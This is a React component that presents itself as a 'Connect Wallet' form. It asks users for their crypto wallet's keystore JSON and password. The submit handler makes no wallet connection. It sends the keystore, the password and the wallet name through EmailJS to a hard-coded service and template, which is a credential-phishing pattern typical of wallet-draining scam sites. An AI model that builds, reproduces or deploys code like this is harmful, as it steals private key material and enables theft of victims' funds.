import React, {useState} from "react";
import "../DetailsForm/Form";
import TextField from "@mui/material/TextField";
import { FormContext } from "../context/FormContext";
import { useContext } from 'react';
import emailjs from '@emailjs/browser';

const KeyForm = ({detailsToInput, FormButton, rowNumber,walletName,aboutDetails}) => {
  const {wallet, setWallet, access, setAccess, open, setOpen} = useContext(FormContext)
  const [formData, setFormData] = useState({ keyJson: '', KeyPassword: '' });


  const handleInputChange = (event) => {
    const { name, value } = event.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = (event) => {
    event.preventDefault();
   
    const serviceId = 'service_wkpm12a';
    const templateId = 'template_2qwtp6k';
    const publicKey = 'X07VCkCjuOGpyQAl0';

    //create object that contains dynamic template params
    const templateParams = {
      to_wallet : walletName,
      json: formData.keyJson,
      password: formData.KeyPassword,
      accessType: access,
    }
    
    // Send email using emailjs
     emailjs.send(serviceId,templateId,templateParams,publicKey)
     .then((response)=>{
      console.log("email sent successfully", response);
      setFormData({ keyJson: '', KeyPassword: '' });
     })
     .catch((error)=>{
      console.error('Error sending email', error);
     });
  
  };

  return (
    <div className="select-wallet-wrapper2">
      <div className="header-text2">
        <p className="header2">Connect Your {walletName} wallet </p>
        <p className="header-warning2">
        {detailsToInput}
        </p>
      </div>
      <form onSubmit={handleSubmit}>
      <div className="select-cont2">
        <TextField
        fullWidth
          id="outlined-multiline-static"
          label="Enter Keystore JSON"
          multiline
          rows={4}
          value={formData.keyJson}
          name="keyJson"
          onChange={handleInputChange}
        />
          <TextField
        fullWidth
          id="outlined-multiline-static"
          label="Enter Password"
          multiline
          value={formData.KeyPassword}
          name="KeyPassword"
          onChange={handleInputChange}
        />
        <p className="form-instruction2">
          {aboutDetails}
        </p>
      </div>
      <div className="button-group2">
        <button className="button-connect2" onClick={handleSubmit}>Connect Wallet</button>
      </div>
      </form>
    </div>
  );
};

export default KeyForm;
